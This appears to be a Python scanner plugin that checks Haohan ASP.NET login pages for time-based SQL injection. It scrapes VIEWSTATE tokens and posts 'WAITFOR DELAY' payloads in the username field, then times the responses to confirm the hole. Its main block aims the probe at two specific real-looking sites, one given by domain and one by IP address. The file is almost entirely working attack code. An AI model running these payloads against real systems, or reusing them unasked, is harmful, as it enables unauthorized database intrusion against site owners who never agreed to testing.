#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105448

import time
import re

def findVIEWSTATE(url):
    m_values=[]
    code, head, res, errcode, _ = curl.curl2(url)
    m1=re.search("__VIEWSTATE.*?value=\"(.*?)\"",res,re.S)
    m2=re.search("__EVENTVALIDATION.*?value=\"(.*?)\"",res,re.S)
    m_values.append(m1.group(1))
    m_values.append(m2.group(1))
    return m_values

def assign(service, arg):
    if service == "haohan":
        return True, arg
        
        
        
def audit(arg):
    
    payload = 'Resource/login.aspx'
    url = arg + payload 
    viewstate_value=findVIEWSTATE(url)
    postdata1 = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='+viewstate_value[0]+'&Login1:txtUserName=%27%20%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&Login1:txtPassword=1&Login1:ImageButton1.x=1&Login1:ImageButton1.y=1&__EVENTVALIDATION='+viewstate_value[1]
    postdata2 = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='+viewstate_value[0]+'&Login1:txtUserName=%27%20%3BWAITFOR%20DELAY%20%270%3A0%3A1%27--&Login1:txtPassword=1&Login1:ImageButton1.x=1&Login1:ImageButton1.y=1&__EVENTVALIDATION='+viewstate_value[1]
    t1 = time.time()
    code1, head, res1, errcode, _ = curl.curl2(url,postdata1)
    t2 = time.time()
    code2, head, res2, errcode, _ = curl.curl2(url,postdata2)
    t3 = time.time()
    if (t2 - t1 - t3 + t2 > 3):
        security_hole(arg+payload)



if __name__ == '__main__':
    from dummy import *
    audit(assign('haohan','http://www.xfls.net/')[1])
    audit(assign('haohan','http://115.236.188.35/')[1])